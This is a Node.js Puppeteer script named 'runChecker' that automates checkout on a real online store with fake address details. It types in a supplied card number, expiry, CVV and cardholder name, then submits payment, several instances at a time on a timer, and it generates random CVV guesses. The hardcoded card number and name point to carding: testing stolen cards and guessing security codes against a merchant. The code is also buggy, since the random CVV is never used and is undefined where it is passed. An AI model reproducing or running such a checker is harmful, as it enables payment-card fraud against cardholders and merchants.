const puppeteer = require("puppeteer");

const runFunction = async (ccNum, ccExp, ccCvv, ccName) => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  try {
    await page.goto("https://alanwatts.com/");

    await page.waitForSelector(
      '.custom__item-inner .btn[href="https://store.alanwatts.org/cart/add?id=33575236046&quantity=1"]',
      { timeout: 60000 }
    );
    await page.click(
      '.custom__item-inner .btn[href="https://store.alanwatts.org/cart/add?id=33575236046&quantity=1"]'
    );

    await page.waitForSelector(
      'input.btn--small-wide[name="checkout"][value="Check out"]',
      { timeout: 60000 }
    );
    await page.click(
      'input.btn--small-wide[name="checkout"][value="Check out"]'
    );

    await page.waitForSelector("input#email", { timeout: 60000 });
    await page.type("input#email", "checkemail@gmail.com");

    await page.waitForSelector("input#TextField0", { timeout: 60000 });
    await page.type("input#TextField0", "John");

    await page.waitForSelector("input#TextField1", { timeout: 60000 });
    await page.type("input#TextField1", "Doe");

    await page.waitForSelector("input#billing-address1", { timeout: 60000 });
    await page.type("input#billing-address1", "6103 New");

    await page.waitForSelector("input#TextField3", { timeout: 60000 });
    await page.type("input#TextField3", "Cleveland");

    await page.waitForSelector("#Select1", { timeout: 60000 });
    await page.select("#Select1", "AL");

    await page.waitForSelector("input#TextField4", { timeout: 60000 });
    await page.type("input#TextField4", "35049");

    const fillCreditCardField = async (frameSelector, inputSelector, value) => {
      await page.waitForSelector(frameSelector, { timeout: 60000 });
      const frameElement = await page.$(frameSelector);
      const frame = await frameElement.contentFrame();
      await frame.waitForSelector(inputSelector, { timeout: 60000 });
      await frame.type(inputSelector, value);
    };

    try {
      // CC Number
      await fillCreditCardField(
        'iframe[id^="card-fields-number"]',
        'input[name="number"]',
        ccNum
      );

      // CC Expiry
      await fillCreditCardField(
        'iframe[id^="card-fields-expiry"]',
        'input[name="expiry"]',
        ccExp
      );

      // CC Cvv
      await fillCreditCardField(
        'iframe[id^="card-fields-verification_value"]',
        'input[name="verification_value"]',
        ccCvv
      );

      // CC Name
      await fillCreditCardField(
        'iframe[id^="card-fields-name"]',
        'input[name="name"]',
        ccName
      );

      await page.waitForSelector("#checkout-pay-button", { timeout: 60000 });

      await page.click("#checkout-pay-button");

      // Wait for the process to complete (simulate waiting for 10 seconds)
      await page.waitForTimeout(10000);
    } catch (error) {
      console.log("Error filling credit card information: ", error);
    }
  } catch (error) {
    console.log("Error during checkout process: ", error);
  }
};

const runChecker = async (ccNum, ccExp, ccCvv, ccName) => {
  const runMultipleInstances = async () => {
    const instances = [];
    for (let i = 0; i < 2; i++) {
      let randomCvv = Math.round(Math.random() * 999).toString();

      if (randomCvv === "150") {
        randomCvv = Math.round(Math.random() * 999).toString();
      }
      instances.push(runFunction(ccNum, ccExp, ccCvv, ccName));
    }
    await Promise.all(instances);
  };

  runMultipleInstances();

  let count = 0;
  const maxCount = 5;

  const intervalId = setInterval(() => {
    if (count < maxCount) {
      runMultipleInstances();
      count++;
    } else {
      clearInterval(intervalId);
    }
  }, 20000);
};

// Run the checker
runChecker("4452560462046010", "08/26", randomCvv, "Brianna Lopez");
